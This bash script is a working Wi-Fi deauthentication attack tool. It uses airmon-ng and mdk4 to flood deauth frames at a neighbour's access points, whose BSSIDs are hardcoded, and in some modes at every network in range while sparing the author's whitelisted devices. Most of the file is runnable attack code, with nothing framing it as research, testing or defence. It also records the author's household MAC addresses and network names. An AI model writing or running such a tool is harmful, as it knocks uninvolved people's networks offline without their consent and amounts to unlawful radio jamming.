#!/bin/bash

TARGET_2_4GHZ_CHANNEL="11"
TARGET_5GHZ_CHANNEL="161"
###################################
# MAC ADDR - TABLE - WHITELSIT (DONT DEAUTH THESE)
# BSSID_NEIGHBOR_24="48:BD:CE:33:53:18"
# BSSID_NEIGHBOR_50="48:BD:CE:33:53:20"
WHITELIST_T460S="48:8F:4C:FF:8B:65"
WHITELIST_T470="74:E5:F9:66:0F:C1"
WHITELIST_MOM_SAMSUNG="AE:D3:35:D8:0C:53"

#
# 48:8F:4C:FF:8B:65  -  T460s (the usb wifi adapter's MAC address, the one we want to whitelist and not deauth) [connected to 48:BD:CE:33:53:18]
# A6:EA:D0:D1:D5:85 - my samsung on the IZZI-HFGU-2.4 2.4ghz [connected to FC:22:1C:30:1C:24]
# AE:D3:35:D8:0C:53 - mom samsung on the IZZI-HFGU 5ghz [connected to 48:A4:72:1B:0E:B5]
# 74:E5:F9:66:0F:C1 - T470 connected to IZZI-HFGU 5ghz [connected to 48:A4:72:1B:0E:B5]
# 48:A4:72:1B:0E:B5 - my AP IZZI-HFGU 5ghz
# FC:22:1C:30:1C:24 - my AP IZZI-HFGU-2.4 2.4ghz
###################################

clear
echo "DEAUTHER - DYNAMIC INTERFACE SELECTION"

# root permisions check / run as root logic
USER=$(whoami)
if [ "$USER" != "root" ]; then
	echo -e "\e[31m Please run this script as root or use sudo \e[0m"
	echo "Please run this script as root or use sudo"
	echo -e "\e[48;5;9m" "\e[1;38;5;16m" "RUNNING ::: sudo $(realpath "$0")" "\e[0m"

	echo -e "\n"

	sudo "$0"

	exit 1
fi

# Checks for package/dependencies installed status and installs them if not already installed
for PACKAGE in aircrack-ng mdk4; do                                                 # the dependencies needed
	if ! apt list --installed $PACKAGE 2>/dev/null | grep -w $PACKAGE >/dev/null; then # the precursor condition to begin checking and installing dependencies
		echo "dependency $PACKAGE is NOT installed .. installing"
		sudo apt update
		sudo apt install -y $PACKAGE

		if ! apt list --installed $PACKAGE 2>/dev/null | grep -w $PACKAGE >/dev/null; then #exits if package is not installed even after installation code was executed...something went wrong
			echo "Posibly didn't install dependency $PACKAGE .. exiting"
			exit
		fi
	fi
done

# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# HELPER FUNCTIONS
# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

FUN_START_MONITOR() {
	echo "[*] Enabling monitor mode on $INTERFACE..."
	# Capture the monitor interface name (it often changes to wlan0mon)
	MON_INTERFACE=$(sudo airmon-ng start $INTERFACE | grep "monitor mode enabled on" | awk '{print $NF}' | tr -d ')' | tr -d '[:space:]')

	if [ ! -z "$MON_INTERFACE" ]; then
		INTERFACE="$MON_INTERFACE"
		echo "[*] Monitor interface is now: $INTERFACE"
	else
		echo "[!] Warning: Could not confirm monitor interface name change. Continuing with $INTERFACE."
	fi
}

CLEANUP() {
	echo -e "\n\n[!] ATTACK INTERRUPTED. CLEANING UP..."
	if [ ! -z "$INTERFACE" ]; then
		echo "[*] Stopping monitor mode on $INTERFACE..."
		# We use 'stop' to revert the interface to managed mode
		sudo airmon-ng stop "$INTERFACE" >/dev/null 2>&1
		sleep 1 # allow some time for interface to stabilize
		sudo ip link set "$INTERFACE" down
		sleep 1 # allow some time for interface to stabilize
		sudo iw dev "$INTERFACE" set type managed
		sleep 1 # allow some time for interface to stabilize
		sudo ip link set "$INTERFACE" up

	fi
	if [ -f "/tmp/whitelist-macs.txt" ]; then
		rm "/tmp/whitelist-macs.txt"
	fi
	echo "[+] Done. System restored."
	echo "▓█▓█▓█▓  Done  ▓█▓█▓█▓"
	exit
}

# Trap SIGINT (Ctrl+C), SIGTERM, and EXIT
trap CLEANUP SIGINT SIGTERM EXIT

SELECT_INTERFACE() {
	echo "Scanning for wireless interfaces..."
	interfaces=($(iw dev | grep Interface | awk '{print $2}'))

	if [ ${#interfaces[@]} -eq 0 ]; then
		echo "No wireless interfaces found. Ensure 'iw' is installed and your card is connected."
		exit 1
	fi

	echo "Available Wireless Interfaces:"
	for i in "${!interfaces[@]}"; do
		echo "[$i] ${interfaces[$i]}"
	done

	read -p "Select interface index (0-$((${#interfaces[@]} - 1))): " idx

	if [[ ! "$idx" =~ ^[0-9]+$ ]] || [ "$idx" -ge "${#interfaces[@]}" ]; then
		echo "Invalid selection. Exiting."
		exit 1
	fi

	INTERFACE="${interfaces[$idx]}"
	echo "Selected Interface: $INTERFACE"
}

# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# ATTACK FUNCTIONS
# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

FUN_DEAUTH_NEIGHBOR() {

	echo "███▓▒░  INITIALIZING DEAUTH NEIGHBOR WIFI ░▒▓███"

	echo " ▁ ▂ ▃ ▄ ▅ ▆ ▇ █  WHITELISTING MACs  █ ▇ ▆ ▅ ▄ ▃ ▂ ▁"
	echo '48:8F:4C:FF:8B:65'
	echo "████████████████████████████████████████████████"

	RUNTIME=25   # How many seconds to run each attack
	SLEEP_TIME=3 # How long to wait between them

	FUN_START_MONITOR

	while true; do

		echo "--- Targeting AP 2 (2.4GHz) on Channel $TARGET_2_4GHZ_CHANNEL ---"
		# Note: Using the whitelist is safer here
		sudo timeout $RUNTIME mdk4 $INTERFACE d -B 48:BD:CE:33:53:18 -W 48:8F:4C:FF:8B:65 -c $TARGET_2_4GHZ_CHANNEL -s 10

		echo "sleeping for: $SLEEP_TIME seconds"
		sleep $SLEEP_TIME

		echo "--- Targeting AP 1 (5GHz) on Channel $TARGET_5GHZ_CHANNEL ---"
		sudo timeout $RUNTIME mdk4 $INTERFACE d -B 48:BD:CE:33:53:20 -c $TARGET_5GHZ_CHANNEL -s 20

		echo "sleeping for: $SLEEP_TIME seconds"
		sleep $SLEEP_TIME

	done
}

FUN_DEAUTH_ALL() {
	echo "███▓▒░  INITIALIZING DEAUTH  ALL WIFI ░▒▓███"

	FUN_START_MONITOR

	cat <<-EOF >/tmp/whitelist-macs.txt
		$WHITELIST_T460S
		$WHITELIST_T470
		$WHITELIST_MOM_SAMSUNG
	EOF
	echo " ▁ ▂ ▃ ▄ ▅ ▆ ▇ █  WHITELISTING MACs  █ ▇ ▆ ▅ ▄ ▃ ▂ ▁"
	cat /tmp/whitelist-macs.txt
	echo "████████████████████████████████████████████████"

	sudo mdk4 $INTERFACE d -w /tmp/whitelist-macs.txt -c h -s 10
}

FUN_DEAUTH_ALL_EXCEPT_IZZI() {

	echo "███▓▒░  INITIALIZING DEAUTH  ALL WIFI EXCEPT IZZI & WHITELISTED  ░▒▓███"

	FUN_START_MONITOR

	cat <<-EOF >/tmp/whitelist-macs.txt
		48:BD:CE:33:53:18
		$WHITELIST_T460S
		$WHITELIST_T470
		$WHITELIST_MOM_SAMSUNG
	EOF
	echo " ▁ ▂ ▃ ▄ ▅ ▆ ▇ █  WHITELISTING MACs  █ ▇ ▆ ▅ ▄ ▃ ▂ ▁"
	cat /tmp/whitelist-macs.txt
	echo "████████████████████████████████████████████████"

	sudo mdk4 $INTERFACE d -w /tmp/whitelist-macs.txt -c h -s 10

}

FUN_DEAUTH_NEIGHBOR_2.4GHZ_ONLY() {
	echo "███▓▒░  INITIALIZING DEAUTH NEIGHBOR WIFI 2.4GHz ONLY ░▒▓███"

	FUN_START_MONITOR

	echo "--- Targeting AP 2 (2.4GHz) on Channel $TARGET_2_4GHZ_CHANNEL ---"
	# Note: Using the whitelist is safer here
	sudo mdk4 $INTERFACE d -B 48:BD:CE:33:53:18 -W $WHITELIST_T460S -c $TARGET_2_4GHZ_CHANNEL -s 5

}

FUN_DEAUTH_NEIGHBOR_5GHZ_ONLY() {
	echo "███▓▒░  INITIALIZING DEAUTH NEIGHBOR WIFI 5GHz ONLY ░▒▓███"

	FUN_START_MONITOR

	echo "--- Targeting AP 1 (5GHz) on Channel $TARGET_5GHZ_CHANNEL ---"
	sudo mdk4 $INTERFACE d -B 48:BD:CE:33:53:20 -W 48:8F:4C:FF:8B:65 -c $TARGET_5GHZ_CHANNEL -s 5

}
# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# PROGRAM ENTRY POINT
# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

SELECT_INTERFACE

echo -e ""
echo "▓▓▓▒▒▒░░░  input 1 to deauth only hardcoded neighbor wifi ( whitelist t460s)  ░░░▒▒▒▓▓▓"
echo "▓▓▓▒▒▒░░░           input 2 to deauth ALL wifi (except whitelist t460s & clients)         ░░░▒▒▒▓▓▓"
echo "▓▓▓▒▒▒░░░           input 3 to deauth ALL wifi (except IZZI-5314 / except whitelist)       ░░░▒▒▒▓▓▓"
echo "▓▓▓▒▒▒░░░           input 4 to deauth only hardcoded neighbor wifi 2.4GHz only ( whitelist t460s)         ░░░▒▒▒▓▓▓"
echo "▓▓▓▒▒▒░░░           input 5 to deauth only hardcoded neighbor wifi 5GHz only ( whitelist t460s)         ░░░▒▒▒▓▓▓"
echo -e ""

read -p "INPUT 1, 2, 3, 4 OR 5: " MASTER_COICE

case "$MASTER_COICE" in
1)
	FUN_DEAUTH_NEIGHBOR
	;;
2)
	FUN_DEAUTH_ALL
	;;
3)
	FUN_DEAUTH_ALL_EXCEPT_IZZI
	;;
4)
	FUN_DEAUTH_NEIGHBOR_2.4GHZ_ONLY
	;;
5)
	FUN_DEAUTH_NEIGHBOR_5GHZ_ONLY
	;;
*)
	echo "invalid choice. MUST BE 1, 2, 3, 4 OR 5"
	echo "exiting"
	exit 1
	;;
esac
